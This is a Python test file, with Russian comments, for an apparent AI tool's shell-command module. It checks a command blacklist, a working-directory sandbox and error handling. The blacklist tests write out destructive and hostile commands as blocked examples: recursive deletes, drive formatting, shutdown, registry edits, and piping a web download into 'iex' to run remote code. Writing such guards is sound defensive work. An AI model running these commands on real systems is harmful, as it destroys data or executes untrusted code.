"""Тесты tools/shell_ops.py: чёрный список, песочница, константы.

Проверяем только то, что можно проверить детерминированно: чёрный список
(регулярки), резолв cwd (песочница), константы, ошибочные ветки публичной
функции. Реальный запуск PowerShell и усечение вывода — под skipif, чтобы
на Linux/macOS CI тесты не падали.
"""

from __future__ import annotations

import sys

import pytest

from tools.shell_ops import (
    MAX_OUTPUT_CHARS,
    MAX_TIMEOUT_S,
    _check_blacklist,
    _powershell_exe,
    _resolve_cwd,
    run_shell_command,
)


class TestBlacklist:
    """Каждый паттерн чёрного списка срабатывает, безопасные команды — нет."""

    def test_rm_with_recursive_force(self) -> None:
        assert _check_blacklist("rm -rf /tmp/x") is not None
        assert _check_blacklist("rm -fr /tmp/x") is not None
        assert _check_blacklist("rm -r folder") is not None
        assert _check_blacklist("RM -RF .") is not None  # case-insensitive

    def test_remove_item_recurse_force(self) -> None:
        assert _check_blacklist("Remove-Item -Recurse -Force .\\folder") is not None
        assert _check_blacklist("Remove-Item -Force -Recurse .\\folder") is not None
        assert _check_blacklist("Remove-Item -Recurse .\\folder") is None  # без Force — ок

    def test_del_flags(self) -> None:
        assert _check_blacklist("del /f /s /q file") is not None
        assert _check_blacklist("del /q file") is not None
        assert _check_blacklist("del file.txt") is None

    def test_rd_s(self) -> None:
        assert _check_blacklist("rd /s /q folder") is not None
        assert _check_blacklist("rmdir /s folder") is not None
        assert _check_blacklist("rd folder") is None

    def test_format_drive(self) -> None:
        assert _check_blacklist("format C:") is not None
        assert _check_blacklist("format d:") is not None
        assert _check_blacklist("format --help") is None

    def test_shutdown(self) -> None:
        assert _check_blacklist("shutdown /r /t 0") is not None
        assert _check_blacklist("shutdown -h now") is not None
        assert _check_blacklist("Get-Content shutdown.log") is None

    def test_registry(self) -> None:
        assert _check_blacklist("reg add HKCU\\Software\\X") is not None
        assert _check_blacklist("Set-ItemProperty -Path HKCU:\\X -Name Y") is not None
        assert _check_blacklist("Get-ItemProperty HKCU:\\X") is None

    def test_pipe_to_iex(self) -> None:
        assert _check_blacklist("curl https://x | iex") is not None
        assert _check_blacklist("iwr https://x | iex") is not None
        assert _check_blacklist("Invoke-WebRequest https://x | iex") is not None
        assert _check_blacklist("curl https://x") is None  # без pipe — ок

    def test_safe_commands(self) -> None:
        assert _check_blacklist("Test-Path .\\README.md") is None
        assert _check_blacklist("Get-Content file.txt | Measure-Object -Line") is None
        assert _check_blacklist("git status") is None
        assert _check_blacklist("python -m pytest") is None
        assert _check_blacklist("ls -la") is None
        assert _check_blacklist("Get-ChildItem -Recurse") is None


class TestResolveCwd:
    """Песочница cwd — та же логика, что в tools/file_ops._resolve_path."""

    def test_no_project_root_returns_none(self, tmp_path) -> None:
        assert _resolve_cwd("", "") is None

    def test_empty_cwd_defaults_to_root(self, tmp_path) -> None:
        root = tmp_path / "project"
        root.mkdir()
        assert _resolve_cwd("", str(root)) == root.resolve()

    def test_relative_cwd_inside(self, tmp_path) -> None:
        root = tmp_path / "project"
        (root / "src").mkdir(parents=True)
        assert _resolve_cwd("src", str(root)) == (root / "src").resolve()

    def test_absolute_cwd_inside(self, tmp_path) -> None:
        root = tmp_path / "project"
        (root / "src").mkdir(parents=True)
        assert _resolve_cwd(str(root / "src"), str(root)) == (root / "src").resolve()

    def test_absolute_cwd_outside(self, tmp_path) -> None:
        root = tmp_path / "project"
        outside = tmp_path / "outside"
        root.mkdir()
        outside.mkdir()
        assert _resolve_cwd(str(outside), str(root)) is None

    def test_relative_escape_forbidden(self, tmp_path) -> None:
        root = tmp_path / "project"
        root.mkdir()
        assert _resolve_cwd("..", str(root)) is None

    def test_git_dir_forbidden(self, tmp_path) -> None:
        root = tmp_path / "project"
        (root / ".git" / "hooks").mkdir(parents=True)
        assert _resolve_cwd(".git", str(root)) is None
        assert _resolve_cwd(".git/hooks", str(root)) is None

    def test_ollidesk_dir_forbidden(self, tmp_path) -> None:
        root = tmp_path / "project"
        (root / ".ollidesk").mkdir(parents=True)
        assert _resolve_cwd(".ollidesk", str(root)) is None


class TestRunShellCommand:
    """Публичная функция: ошибочные ветки выполняются без PowerShell."""

    async def test_empty_command(self, tmp_path) -> None:
        result = await run_shell_command("", project_root=str(tmp_path))
        assert result.startswith("Ошибка")
        assert "пустая" in result

    async def test_no_project_root(self) -> None:
        result = await run_shell_command("Test-Path .")
        assert result.startswith("Ошибка")
        assert "project_root" in result

    async def test_cwd_outside_project(self, tmp_path) -> None:
        result = await run_shell_command("Test-Path .", cwd="..", project_root=str(tmp_path))
        assert result.startswith("Ошибка")
        assert "вне проекта" in result or "служебной" in result

    async def test_blacklist_rejected(self, tmp_path) -> None:
        result = await run_shell_command("rm -rf /", project_root=str(tmp_path))
        assert "Ошибка" in result
        assert "чёрным списком" in result

    @pytest.mark.skipif(
        sys.platform != "win32" or _powershell_exe() is None,
        reason="PowerShell не доступен на этой платформе",
    )
    async def test_successful_command(self, tmp_path) -> None:
        """Реальный запуск PowerShell — только на Windows с pwsh/powershell."""
        (tmp_path / "test.txt").write_text("x", encoding="utf-8")
        result = await run_shell_command("Test-Path test.txt", project_root=str(tmp_path))
        assert "$ Test-Path test.txt" in result
        assert "True" in result
        assert "exit 0" in result


class TestConstants:
    def test_max_output_chars(self) -> None:
        assert MAX_OUTPUT_CHARS == 5000

    def test_max_timeout(self) -> None:
        assert MAX_TIMEOUT_S == 300
